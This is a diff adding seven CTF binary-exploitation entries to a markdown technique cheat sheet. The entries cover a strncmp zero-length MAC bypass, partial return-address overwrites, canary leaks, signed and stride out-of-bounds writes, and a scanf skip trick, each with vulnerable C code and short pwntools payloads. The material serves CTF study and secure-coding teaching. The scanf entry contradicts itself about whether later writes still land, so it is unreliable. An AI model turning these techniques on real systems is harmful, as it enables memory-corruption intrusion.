@@ -17,6 +17,13 @@
 - [Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)](#protocol-length-field-stack-bleeding-ekoparty-ctf-2016)
 - [Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)](#parser-stack-overflow-via-unchecked-memcpy-length-metactf-flash-2026)
 - [Stack Canary Null-Byte Overwrite Leak (CSAW 2017)](#stack-canary-null-byte-overwrite-leak-csaw-2017)
+- [Empty-Token strncmp(n=0) MAC Bypass (UCSB iCTF 2018)](#empty-token-strncmpn0-mac-bypass-ucsb-ictf-2018)
+- [Return Address LSB Overwrite + read() Chaining (TUCTF 2018)](#return-address-lsb-overwrite--read-chaining-tuctf-2018)
+- [Canary Trailing-Byte Leak via Padding One Byte Past Null (hxp 2018)](#canary-trailing-byte-leak-via-padding-one-byte-past-null-hxp-2018)
+- [Index-Only Bounds Check + Stride OOB Write (P.W.N. CTF 2018)](#index-only-bounds-check--stride-oob-write-pwn-ctf-2018)
+- [Signed Index Negative OOB to Preceding GOT (P.W.N. CTF 2018)](#signed-index-negative-oob-to-preceding-got-pwn-ctf-2018)
+- [PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)](#pie-same-page-function-pivot-via-single-byte-overwrite-pwn-ctf-2018)
+- [scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)](#scanf-format-error-skip-for-canary-preservation-nullcon-hackim-2019)
 
 ---
 
@@ -466,3 +473,139 @@ p.send(b'A' * buf_size + canary + p64(0) + p64(win_addr))
 **Key insight:** The canary's null byte terminator is a weakness — overwriting only it makes string functions print the canary value. Return-to-main provides a second exploitation opportunity with the leaked canary, enabling full ROP chain construction.
 
 **References:** CSAW 2017
+
+---
+
+## Empty-Token strncmp(n=0) MAC Bypass (UCSB iCTF 2018)
+
+**Pattern:** A MAC or auth token check extracts `n` (comparison length) from a user-supplied field and then calls `strncmp(expected, supplied, n)`. When `n == 0`, `strncmp` returns 0 regardless of input — every token is accepted.
+
+**Vulnerable code:**
+```c
+int n = atoi(user_len);            // attacker controls length
+if (strncmp(expected_mac, user_mac, n) == 0) {
+    grant_access();
+}
+```
+
+**Exploit:** Send the token with `len=0` (or a length field that parses to zero) and an arbitrary MAC.
+
+**Key insight:** Any variable-length comparator (`strncmp`, `memcmp`, `bcmp`) returns equality for zero-length input. Validate the length separately: reject `n <= 0`, or use `CRYPTO_memcmp`/`hmac_equal` and compare full fixed-size buffers. The same bug appears when the length comes from a client-supplied HMAC size or TLV header.
+
+**References:** UCSB iCTF 2018 — writeup 10009
+
+---
+
+## Return Address LSB Overwrite + read() Chaining (TUCTF 2018)
+
+**Pattern:** `read(0, buf, 0x80)` overflows into the saved return address by exactly one byte (off-by-one in the read size). Overwriting only the LSB keeps the high bytes intact, so you land a few bytes earlier in the same function. Pick a byte that points inside the function prologue before another `read()` call — it fires again with attacker-controlled args.
+
+```python
+# Offset 29 in the buffer = saved RIP LSB
+payload = b'\x15' * 29     # 0x56555d22 -> 0x56555d15 (inside read() prologue)
+p.sendline(payload)
+
+# Second read call now reads into &password with length 0x2b
+p.send(p32(0) + p32(password_addr) + p32(0x2b))
+```
+
+**Key insight:** A one-byte ret overwrite reused as a "call this function again" primitive is often stronger than a full ROP, because you bypass ASLR entirely — you jump to an instruction already at a known relative offset.
+
+**References:** TUCTF 2018 — Lisa, writeup 12339
+
+---
+
+## Canary Trailing-Byte Leak via Padding One Byte Past Null (hxp 2018)
+
+**Pattern:** glibc stack canaries always start with `0x00` so that `strcpy`/`printf("%s")` stops immediately. Send exactly `buf_size + 1` bytes; the `puts()` echo passes the canary's leading null and prints the remaining three bytes, giving you 3/4 of the canary.
+
+```python
+p.send(b'A' * (buf_size + 1))
+leaked = p.recvline().rstrip(b'\n')
+canary = b'\x00' + leaked[buf_size:]     # reconstruct full 4-byte canary
+```
+
+**Key insight:** The canary byte that makes it "safe" against string operations is also the byte that enables the leak — replace it with a non-null byte, and the echo spills everything up to the next null.
+
+**References:** hxp CTF 2018 — poor_canary, writeup 12568
+
+---
+
+## Index-Only Bounds Check + Stride OOB Write (P.W.N. CTF 2018)
+
+**Pattern:** Vulnerable function reads an index `v2`, checks `v2 <= 0xfc`, and writes `0xC` bytes at `array[12 * v2]`. The check covers the *index*, not the *computed byte offset*. Pick `v2` so `12 * v2` lands well past the buffer (saved RIP, canary, GOT).
+
+```c
+if (v2 <= 0xFC) read(0, &array[12*v2], 0xC);   // bug: stride unchecked
+```
+
+Set `v2 = 0xFB` to write 12 bytes at offset `12 * 0xFB = 0xBC4` past the array base.
+
+**Key insight:** Every "bounded index" check must multiply by the element stride before comparing. Look for any `array[N*idx]` or struct-indexed writes where the check is only on `idx`; the effective bound is `max_offset / stride`.
+
+**References:** P.W.N. CTF 2018 — Exploitation Class / Kindergarten PWN, writeup 12041
+
+---
+
+## Signed Index Negative OOB to Preceding GOT (P.W.N. CTF 2018)
+
+**Pattern:** `if (v5 <= 31) array[v5] = value;` compiles to a *signed* comparison. Passing `-1`, `-2`, ... passes the check and writes backward into preceding memory — typically the GOT or adjacent global structures.
+
+```c
+int v5 = atoi(input);     // signed
+if (v5 <= 31) table[v5] = new_value;   // writes to table[-N]
+```
+
+Use negative indices to first leak libc (`read` GOT) and then overwrite a free GOT entry with `system`.
+
+**Key insight:** Signed vs unsigned mismatches are everywhere. Always check the declared type; a `<= N` guard with a signed index is actually `[INT_MIN..N]`. Compile with `-Wsign-conversion` to catch this statically.
+
+**References:** P.W.N. CTF 2018 — Kindergarten PWN, writeup 12041
+
+---
+
+## PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)
+
+**Pattern:** Binary is PIE but two functions live in the same 4 KiB page: `fread_callback` at `base + 0x11BC` and `shell()` at `base + 0x11A9`. Page-relative offsets are fixed by the linker, so overwriting only the *low byte* of the stored function pointer on the stack rewrites `0xBC` → `0xA9` without needing any leak.
+
+```python
+p.send(b'A' * overflow_to_fp + b'\xa9')
+```
+
+**Key insight:** PIE randomises only page-aligned bits. Any two code addresses that share a page differ exclusively in the low 12 bits, so a single-byte overwrite is an ASLR-free partial overwrite whenever you can land the victim function in the same page during compilation.
+
+**References:** P.W.N. CTF 2018 — Important Service, writeup 12041
+
+---
+
+## scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)
+
+**Pattern (babypwn):** `coin_count` is compared as signed (`(char)count > 20` rejects only positive overflow) but iterated as unsigned (`for (uint8_t i = 0; i < count; ++i)`). Sending `128` passes the check yet loops 128 times, walking past a 20-slot int array, the stack canary, saved RBP, and saved RIP. The standard "leak the canary with the same bug" trick fails because the vulnerable `printf` fires only **after** the overflow loop. Instead, feed scanf an invalid-but-format-conforming token on the two canary iterations so scanf returns error **without consuming input and without writing** — the canary stays intact while subsequent iterations continue writing past it.
+
+```python
+from pwn import *
+
+target.sendline('y')
+target.sendline('2019')           # name
+target.sendline('128')            # unsigned char > 20 passes signed check
+
+# Leak libc via GOT addresses in the first 8 coin slots (%8$s in the format string)
+target.sendline(str(0x600FA8))    # free@GOT lower 32 bits
+target.sendline(str(0))           # free@GOT upper 32 bits
+# ... repeat for puts / setbuf / printf ...
+
+for i in range(14):               # pad to reach canary slot (22 writes in)
+    target.sendline('1')
+    target.sendline('2')
+
+target.sendline('-')              # "-" matches "%d" prefix but can't be a number
+target.sendline('-')              # scanf returns error, leaves canary untouched
+target.sendline('0')              # saved libc_csu_init slot - scratch
+target.sendline('0')
+target.sendline(str(0x400806))    # return address -> main() for stage 2
+target.sendline(str(0))
+```
+
+**Key insight:** `scanf("%d", ...)` treats a lone `-` as a format mismatch — it returns early without writing to the destination and, crucially, without consuming the `-` byte; the next scanf call will then fail identically. Using this skip primitive you can surgically choose which iterations of a "fixed-count" write loop actually land on the stack, letting you hop over canary/RBP slots to reach the return address. Combine with a signed/unsigned char comparison bug to get a loop count larger than the declared max.
+
+**References:** nullcon HackIM 2019 — babypwn, writeup 13211
